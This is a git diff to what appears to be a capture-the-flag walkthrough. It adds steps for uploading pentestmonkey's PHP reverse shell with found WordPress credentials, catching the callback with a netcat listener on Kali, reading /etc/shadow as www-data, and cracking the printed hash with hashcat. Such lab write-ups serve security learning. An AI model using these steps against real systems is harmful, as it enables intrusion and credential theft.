@@ -220,10 +220,9 @@ Trying admin / admin Time: 00:03:36 <===========================================
 {% endhighlight %}
 
 With *username* and *password* under our kitty, we can use them to upload the `webshells`. There is a lot of material
-avilable to create a webshell in php. You can refer [hacksland.net](https://hacksland.net/build-a-simple-web-shell/) 
-for a simple webshell.
+avilable to create a webshell in php. You can refer [www.acunetix.com](https://www.acunetix.com/websitesecurity/introduction-web-shells/) for a simple webshell and for using `Weevely`, which is a lightweight PHP telnet-like web-shell. 
 
-However, for our purpose we will be using the webshell provided by (pentestmonkey)[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php]. Just to provide an insight into the 
+However, for our purpose we will be using the webshell provided by [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Just to provide an insight into the 
 working of this webshell, it broadly does following :
 
   1. Creates a deamon in the victim machine, which in turn makes a reverse TCP connection with the  attacker machine. `deamons` are in `unix/linux` what `services` are in windows.
@@ -232,9 +231,44 @@ working of this webshell, it broadly does following :
   4. The response received from the bash shell is passed to the deamon which inturn sends it to the attacker machine through
 reverse TCP connection.
 
+Once we upload the shell, which can be done with one of the ways mentioned in [www.hackingarticles.in](https://www.hackingarticles.in/wordpress-reverse-shell/), we get the `www-data` access. In order, for the webshell to connect back
+to the Kali attacker machine, we can run `nc`.
 
+{% highlight console %}
+root@kali:~# nc -lvp 1234
+Listening on 0.0.0.0 1234
+{% endhighlight %}
 
+We can also check the status of ports on which the `nc` is running 
 
+{% highlight console %}
+root@kali:~# netstat -plntu
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      18166/nc            
+{% endhighlight %}
 
+Once, the *webshell* makes a reverse TCP connection we get 
 
+{% highlight console %}
+root@kali:~# nc -lvp 1234
+Listening on 0.0.0.0 1234
+Connection received on vtcsec 37790
+Linux vtcsec 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 20:31:38 up 2 days, 15:39,  0 users,  load average: 0.02, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ cat /etc/shadow
+marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
+{% endhighlight %}
+
+In order to find *users* in the linux system you can refer this article [linuxize.com](https://linuxize.com/post/how-to-list-users-in-linux/)
+
+The password can be obtained by cracking the hashes using `John the Ripper` or `hashcat`. 
+{% highlight console %}
+1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems
+{% endhighlight %}
 
